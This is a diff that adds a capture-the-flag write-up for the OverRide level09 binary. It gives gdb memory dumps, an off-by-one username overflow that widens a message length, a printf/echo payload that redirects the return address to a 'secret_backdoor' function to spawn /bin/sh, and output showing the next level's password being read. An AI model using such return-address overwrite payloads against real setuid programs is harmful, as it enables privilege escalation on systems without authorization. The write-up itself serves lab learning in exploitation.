@@ -1,0 +1,90 @@
+```
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
+
+level09: setuid setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xa1a3a49786f29814c5abd4fc6d7a685800a3d454, not stripped
+```
+
+Check if we can overwrite username:
+```
+(gdb) disas handle_msg
+    ...
+   0x00005555555548cb <+11>:	lea    rax,[rbp-0xc0]
+   0x00005555555548d2 <+18>:	add    rax,0x8c
+   ...
+
+Breakpoint 8, 0x0000555555554910 in handle_msg ()
+(gdb) c
+Continuing.
+>: Enter your username
+>>: AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ111111112222222233333333444444445555555566666666777777778888888899999999
+
+Breakpoint 9, 0x0000555555554915 in handle_msg ()
+(gdb) x/200x $rbp-0xc0
+0x7fffffffe500:	0x0000000a	0x00000000	0x55554c69	0x00005555
+0x7fffffffe510:	0xf7ff7000	0x00007fff	0xf7a94713	0x00007fff
+0x7fffffffe520:	0xf7dd4260	0x00007fff	0xf7dd4260	0x00007fff
+0x7fffffffe530:	0x0000000a	0x00000000	0xf7ff7000	0x00007fff
+0x7fffffffe540:	0x0000002d	0x00000000	0xf7a945da	0x00007fff
+0x7fffffffe550:	0x00000086	0x00000000	0x0000002d	0x00000000
+0x7fffffffe560:	0x0000000a	0x00000000	0x55554c10	0x00005555
+0x7fffffffe570:	0xffffe6b0	0x00007fff	0xf7a95d45	0x00007fff
+0x7fffffffe580:	0xf7dd4260	0x00007fff	0xf7a9608f	0x41414141
+0x7fffffffe590:	0x41414141	0x42424242	0x42424242	0x43434343
+0x7fffffffe5a0:	0x43434343	0x44444444	0x44444444	0x45454545
+0x7fffffffe5b0:	0x45454545	0x00000046	0xffffe5d0	0x00007fff
+0x7fffffffe5c0:	0xffffe5d0	0x00007fff	0x55554abd	0x00005555
+0x7fffffffe5d0:	0x00000000	0x00000000	0xf7a3d7ed	0x00007fff
+0x7fffffffe5e0:	0x00000000	0x00000000	0xffffe6b8	0x00007fff
+```
+We can see that we've overwriten one bytes with `46`, while there is only 40 bytes `char username[0x40];`
+
+With that we can control the write size of the msg, let's find everting we need:
+```bash
+rsp            0x7fffffffe500	0x7fffffffe500
+rbp            0x7fffffffe5c0	0x7fffffffe5c0
+
+(gdb) x/56x $rsp
+0x7fffffffe500:	0x0000000a	0x00000000	0x55554c69	0x00005555
+0x7fffffffe510:	0xf7ff7000	0x00007fff	0xf7a94713	0x00007fff
+0x7fffffffe520:	0xf7dd4260	0x00007fff	0xf7dd4260	0x00007fff
+0x7fffffffe530:	0x0000000a	0x00000000	0xf7ff7000	0x00007fff
+0x7fffffffe540:	0x0000002d	0x00000000	0xf7a945da	0x00007fff
+0x7fffffffe550:	0x00000086	0x00000000	0x0000002d	0x00000000
+0x7fffffffe560:	0x0000000a	0x00000000	0x55554c10	0x00005555
+0x7fffffffe570:	0xffffe6b0	0x00007fff	0xf7a95d45	0x00007fff
+0x7fffffffe580:	0xf7dd4260	0x00007fff	0xf7a9608f	0x41414141 # start of username
+0x7fffffffe590:	0x41414141	0x42424242	0x42424242	0x43434343
+0x7fffffffe5a0:	0x43434343	0x44444444	0x44444444	0x45454545
+0x7fffffffe5b0:	0x45454545	0x00000046	0xffffe5d0	0x00007fff
+0x7fffffffe5c0:	0xffffe5d0	0x00007fff	0x55554abd	0x00005555 # rip value here
+
+(gdb) info address secret_backdoor
+Symbol "secret_backdoor" is at 0x55555555488c in a file compiled without debugging.
+```
+
+We write the payload:
+```bash
+rm -f /tmp/level09
+printf 'A%.0s' {1..40} > /tmp/level09 # padding for username
+echo -ne "\xff" >> /tmp/level09 # change the value of env->max_msg_len
+printf 'A%.0s' {1..88} >> /tmp/level09 # padding for fgets
+printf 'B%.0s' {1..198} >> /tmp/level09 # padding to rip
+echo -ne "\x8c\x48\x55\x55\x55\x55\x0" >> /tmp/level09 # the address of secret backdoor 0x000055555555488c 
+printf 'C%.0s' {1..816} >> /tmp/level09 # padding for fgets
+echo -ne "/bin/sh" >> /tmp/level09 # system() string
+```
+
+And run it:
+```bash
+level09@OverRide:~$ cat /tmp/level09 - | ./level09 
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+```
